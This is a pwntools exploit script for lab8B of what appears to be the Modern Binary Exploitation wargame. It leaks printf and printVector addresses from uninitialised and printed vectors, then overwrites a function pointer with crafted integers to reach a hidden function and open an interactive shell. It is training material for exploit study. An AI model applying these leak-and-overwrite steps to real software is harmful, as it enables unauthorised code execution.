# Based on https://github.com/ewilded/MBE-snippets/blob/master/LAB7C/exploit.py
from pwn import *

settings = {
    # Path to binary
    "binary"        : "/levels/lab08/lab8B",
}
# Exploit here
def exploit():
    # Available variables
    # p      => Tubes! (http://docs.pwntools.com/en/stable/tubes.html)
    # binary => ELF of binary
	
	# We start with printing the first vector without initializing it with anything, this will leak the printf() address:
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","3")
    p.sendlineafter("Which vector? ","1")
    leak = p.recv()
    printf_addr = u32(leak[0x0:0x4])
    print("Leaked printf() address: ",hex(printf_addr))
	
    # Now we initiate the vector 1 with data, then we will print it. This way we will leak the printVector() address.
    # For now we initiate it with test data (1,2,3):
    p.sendline("1") # Action
    p.sendline("1") # Vector number
    p.sendline(p8(0x1)) # 1, this has to go as literal, because the type here is char read by getchar()
    p.sendline("2") # These are sent as strings, although we mean numbers, they are read by scanf().
    p.sendline("3") #
    p.sendline("-2147483648") # This is the "unsigned int d", the field we achieve pointer overwrite with, anything else can have any value at all, 
    p.sendline("5") # as long as it is not 0 (in this version of exploit, where we aim at thisIsASecret()).
    p.sendline("6")
    p.sendline("7")
    p.sendline("8")
    p.sendline("9")
    p.recv()		# Flush the output buffer


	# Now let's print the first vector to leak the printFunc address (we can't print the sum vector unless we load it into a fav and then either print favs or load it from a fav to one of those vectors).
    p.sendline("3")
    p.sendlineafter("Which vector? ","1")
    v1_addr = int(p.recvline().split(" ")[1].strip(),16)
    print_vector_addr = int(p.recvline().split(" ")[2].strip(),16)
    print("Leaked v1() address: ",hex(v1_addr))
    print("Leaked printFunc() address: ",hex(print_vector_addr))
	
    this_is_a_secret_addr = print_vector_addr - 0x42
    print("Calculated thisIsASecret() address: ", hex(this_is_a_secret_addr))
    # OK, let's attach gdb here
    # Now, we create the second vector (in this version of the exploit we only care about the first int we send, anything else is irrelevant and OK as long as it is not 0)
    p.sendline("1") # Action
    p.sendline("2") # Vector number
    p.sendline("@") # 1, this has to go as literal, because the type here is char read by getchar()
    p.sendline("16448") # These are sent as strings, although we mean numbers, they are read by scanf().
    p.sendline("16448") # 2 shorts (signed and unsigned).
    p.sendline("4263") 	# 4 ints (sizeof of int and long it is 4 bytes in this case, hence they're all the same)
    p.sendline("1077952576") # signed and unsigned int
    p.sendline("1077952576") # same for longs
    p.sendline("1077952576") # 
    p.sendline("4629771061636907072")	# these are signed and unsigned long longs (64 bits, 8 bytes)
    p.sendline("4629771061636907072")	#
	
    # Now we sum them up
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","2")
	
    # Now, we add our sum to favorites 4 times
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","4")
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","4")
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","4")
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","4")

    # Load favorite
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","6")
    p.sendlineafter("Which favorite? ","3")
    p.sendlineafter("Which vector? ","1")
	
    #print("PID: "+str(pidof(p)))
    #pause()
    # OK, shell time
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","3")
    p.sendlineafter("Which vector? ","1")
    p.interactive()
    #p.sendline("0") # quit
    #p.recv()
    return 0

# Initial setup
if __name__  == "__main__":
	
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    p = process(binary.path,stdin=PTY)
    exploit()
